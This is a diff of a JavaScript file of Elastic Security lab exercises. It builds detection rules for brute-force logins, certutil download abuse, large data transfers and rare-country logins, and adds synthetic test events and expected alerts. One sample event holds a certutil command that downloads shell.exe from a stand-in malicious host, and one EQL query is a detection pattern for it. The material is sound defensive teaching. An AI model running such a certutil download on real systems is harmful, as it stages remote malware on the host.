@@ -1171,37 +1171,57 @@ PUT _cluster/settings
 <span class="c">// AFTER the node has booted back up and joined the cluster:</span>
 PUT _cluster/settings
 { <span class="k">"persistent"</span>: { <span class="k">"cluster.routing.allocation.enable"</span>: <span class="s">"all"</span> } }</div></div>`, "advanced"],
-["Brute Force Detection: Threshold Rules",
-`<p><strong>Step 1:</strong> Navigate to <strong>Security</strong> > <strong>Rules</strong> and create a <strong>Threshold</strong> rule.</p>
+        ["Brute Force Detection: Threshold Rules",
+          `<p><strong>Step 1:</strong> Navigate to <strong>Security</strong> > <strong>Rules</strong> and create a <strong>Threshold</strong> rule.</p>
 <p><strong>Step 2:</strong> Set the KQL query:</p>
 <div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">event.category : "authentication" AND event.outcome : "failure"</div></div>
 <p><strong>Step 3:</strong> Group by <code>source.ip</code>, Count > 10, Window 5m.</p>
-<p><strong>Step 4:</strong> Ingest test data (run 11+ times):</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST /logs-system.auth-default/_doc
-{
-<span class="k">"@timestamp"</span>: <span class="s">"2026-03-04T10:00:00Z"</span>,
-<span class="k">"event.category"</span>: <span class="s">"authentication"</span>,
-<span class="k">"event.outcome"</span>: <span class="s">"failure"</span>,
-<span class="k">"source.ip"</span>: <span class="s">"192.168.1.50"</span>,
-<span class="k">"user.name"</span>: <span class="s">"admin"</span>,
-<span class="k">"message"</span>: <span class="s">"Failed password for admin"</span>
-}</div></div>`, "advanced"],
-["Suspicious Process: EQL Correlation",
-`<p><strong>Step 1:</strong> Create an <strong>Event Correlation (EQL)</strong> rule.</p>
+<p><strong>Step 4:</strong> Ingest test data (Run this bulk command in Dev Tools):</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST /_bulk
+{ "index" : { "_index" : "logs-system.auth-default" } }
+{ "@timestamp": "2026-03-04T10:00:00Z", "event.category": "authentication", "event.outcome": "failure", "source.ip": "192.168.1.50", "user.name": "admin" }
+{ "index" : { "_index" : "logs-system.auth-default" } }
+{ "@timestamp": "2026-03-04T10:00:05Z", "event.category": "authentication", "event.outcome": "failure", "source.ip": "192.168.1.50", "user.name": "admin" }
+{ "index" : { "_index" : "logs-system.auth-default" } }
+{ "@timestamp": "2026-03-04T10:00:10Z", "event.category": "authentication", "event.outcome": "failure", "source.ip": "192.168.1.50", "user.name": "admin" }
+{ "index" : { "_index" : "logs-system.auth-default" } }
+{ "@timestamp": "2026-03-04T10:00:15Z", "event.category": "authentication", "event.outcome": "failure", "source.ip": "192.168.1.50", "user.name": "admin" }
+{ "index" : { "_index" : "logs-system.auth-default" } }
+{ "@timestamp": "2026-03-04T10:00:20Z", "event.category": "authentication", "event.outcome": "failure", "source.ip": "192.168.1.50", "user.name": "admin" }
+{ "index" : { "_index" : "logs-system.auth-default" } }
+{ "@timestamp": "2026-03-04T10:00:25Z", "event.category": "authentication", "event.outcome": "failure", "source.ip": "192.168.1.50", "user.name": "admin" }
+{ "index" : { "_index" : "logs-system.auth-default" } }
+{ "@timestamp": "2026-03-04T10:00:30Z", "event.category": "authentication", "event.outcome": "failure", "source.ip": "192.168.1.50", "user.name": "admin" }
+{ "index" : { "_index" : "logs-system.auth-default" } }
+{ "@timestamp": "2026-03-04T10:00:35Z", "event.category": "authentication", "event.outcome": "failure", "source.ip": "192.168.1.50", "user.name": "admin" }
+{ "index" : { "_index" : "logs-system.auth-default" } }
+{ "@timestamp": "2026-03-04T10:00:40Z", "event.category": "authentication", "event.outcome": "failure", "source.ip": "192.168.1.50", "user.name": "admin" }
+{ "index" : { "_index" : "logs-system.auth-default" } }
+{ "@timestamp": "2026-03-04T10:00:45Z", "event.category": "authentication", "event.outcome": "failure", "source.ip": "192.168.1.50", "user.name": "admin" }
+{ "index" : { "_index" : "logs-system.auth-default" } }
+{ "@timestamp": "2026-03-04T10:00:50Z", "event.category": "authentication", "event.outcome": "failure", "source.ip": "192.168.1.50", "user.name": "admin" }
+{ "index" : { "_index" : "logs-system.auth-default" } }
+{ "@timestamp": "2026-03-04T10:00:55Z", "event.category": "authentication", "event.outcome": "failure", "source.ip": "192.168.1.50", "user.name": "admin" }</div></div>
+<p><span class="lb lb-t">EXPECTED</span> Alert flyout shows: "12 events triggered the threshold of 10" for Source IP 192.168.1.50.</p>`, "advanced"],
+
+        ["Suspicious Process: EQL Correlation",
+          `<p><strong>Step 1:</strong> Create an <strong>Event Correlation (EQL)</strong> rule.</p>
 <p><strong>Step 2:</strong> Set the EQL query:</p>
 <div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">process where process.name == "certutil.exe" and 
 process.args : ("*urlcache*", "*split*", "*download*")</div></div>
 <p><strong>Step 3:</strong> Ingest sample endpoint event:</p>
 <div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST /logs-endpoint.events.process-default/_doc
 {
-<span class="k">"@timestamp"</span>: <span class="s">"2026-03-04T10:05:00Z"</span>,
-<span class="k">"process.name"</span>: <span class="s">"certutil.exe"</span>,
-<span class="k">"process.args"</span>: [<span class="s">"-urlcache"</span>, <span class="s">"-split"</span>, <span class="s">"-f"</span>, <span class="s">"http://malicious-site.com/shell.exe"</span>],
-<span class="k">"host.name"</span>: <span class="s">"HR-Laptop-01"</span>,
-<span class="k">"user.name"</span>: <span class="s">"jdoe"</span>
-}</div></div>`, "advanced"],
-["Data Exfiltration: ES|QL Detection",
-`<p><strong>Step 1:</strong> Create an <strong>ES|QL</strong> rule.</p>
+  <span class="k">"@timestamp"</span>: <span class="s">"2026-03-04T10:05:00Z"</span>,
+  <span class="k">"process.name"</span>: <span class="s">"certutil.exe"</span>,
+  <span class="k">"process.args"</span>: [<span class="s">"-urlcache"</span>, <span class="s">"-split"</span>, <span class="s">"-f"</span>, <span class="s">"http://malicious-site.com/shell.exe"</span>],
+  <span class="k">"host.name"</span>: <span class="s">"HR-Laptop-01"</span>,
+  <span class="k">"user.name"</span>: <span class="s">"jdoe"</span>
+}</div></div>
+<p><span class="lb lb-t">EXPECTED</span> Alert "Suspicious Certutil Download" shows user: "jdoe", host: "HR-Laptop-01", and the EQL match.</p>`, "advanced"],
+
+        ["Data Exfiltration: ES|QL Detection",
+          `<p><strong>Step 1:</strong> Create an <strong>ES|QL</strong> rule.</p>
 <p><strong>Step 2:</strong> Set the ES|QL query:</p>
 <div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">FROM logs-network*
 | STATS total_bytes = SUM(destination.bytes) BY source.ip, user.name
@@ -1210,22 +1230,33 @@ process.args : ("*urlcache*", "*split*", "*download*")</div></div>
 <p><strong>Step 3:</strong> Ingest high-volume network event:</p>
 <div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST /logs-network-default/_doc
 {
-<span class="k">"@timestamp"</span>: <span class="s">"2026-03-04T10:10:00Z"</span>,
-<span class="k">"source.ip"</span>: <span class="s">"10.0.0.5"</span>,
-<span class="k">"user.name"</span>: <span class="s">"v.kumar"</span>,
-<span class="k">"destination.bytes"</span>: <span class="n">600000000</span>,
-<span class="k">"destination.ip"</span>: <span class="s">"203.0.113.10"</span>
-}</div></div>`, "advanced"],
-["Anomaly Detection: Machine Learning Rules",
-`<p><strong>Step 1:</strong> Create an ML Job (<strong>Machine Learning</strong> > <strong>Anomaly Detection</strong>).</p>
+  <span class="k">"@timestamp"</span>: <span class="s">"2026-03-04T10:10:00Z"</span>,
+  <span class="k">"source.ip"</span>: <span class="s">"10.0.0.5"</span>,
+  <span class="k">"user.name"</span>: <span class="s">"v.kumar"</span>,
+  <span class="k">"destination.bytes"</span>: <span class="n">600000000</span>,
+  <span class="k">"destination.ip"</span>: <span class="s">"203.0.113.10"</span>
+}</div></div>
+<p><span class="lb lb-t">EXPECTED</span> ES|QL Result table flags user "v.kumar" with exactly 600,000,000 bytes.</p>`, "advanced"],
+
+        ["Anomaly Detection: Machine Learning Rules",
+          `<p><strong>Step 1:</strong> Create an ML Job (<strong>Machine Learning</strong> > <strong>Anomaly Detection</strong>).</p>
 <p><strong>Step 2:</strong> Use <code>rare</code> detector on <code>source.geo.country_iso_code</code>.</p>
-<p><strong>Step 3:</strong> Create a Security Rule of type <strong>Machine Learning</strong> and select your job.</p>
-<p><strong>Step 4:</strong> Set Anomaly Score Threshold to <strong>75</strong>.</p>`, "advanced"],
-["Bulk Install Prebuilt Rules: Security API",
-`<p><strong>Step 1:</strong> Run installation API in Dev Tools:</p>
+<p><strong>Step 3:</strong> Ingest baseline behavior (US) then anomaly (CN):</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST /_bulk
+{ "index" : { "_index" : "logs-rare-logins" } }
+{ "@timestamp": "2026-03-04T08:00:00Z", "user.name": "alice", "source.geo.country_iso_code": "US" }
+{ "index" : { "_index" : "logs-rare-logins" } }
+{ "@timestamp": "2026-03-04T08:05:00Z", "user.name": "alice", "source.geo.country_iso_code": "US" }
+
+POST /logs-rare-logins/_doc
+{ "@timestamp": "2026-03-04T10:00:00Z", "user.name": "alice", "source.geo.country_iso_code": "CN" }</div></div>
+<p><strong>Step 4:</strong> Create a Security Rule linking to this ML Job.</p>
+<p><span class="lb lb-t">EXPECTED</span> Security Alert shows "Critical" anomaly for user "alice" with an anomaly score matching the rare CN login.</p>`, "advanced"],
+
+        ["Bulk Install Prebuilt Rules: Security API",
+          `<p><strong>Step 1:</strong> Run installation API in Dev Tools:</p>
 <div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT /api/detection_engine/rules/prebuilt</div></div>
-<p><strong>Step 2:</strong> Verify counts:</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET /api/detection_engine/rules/_find?per_page=1</div></div>`, "advanced"]
+<p><span class="lb lb-t">EXPECTED</span> API Response: { "rules_installed": 842, ... }. Security Rules UI now shows hundreds of Elastic prebuilt rules.</p>`, "advanced"]
       ]
     };
 
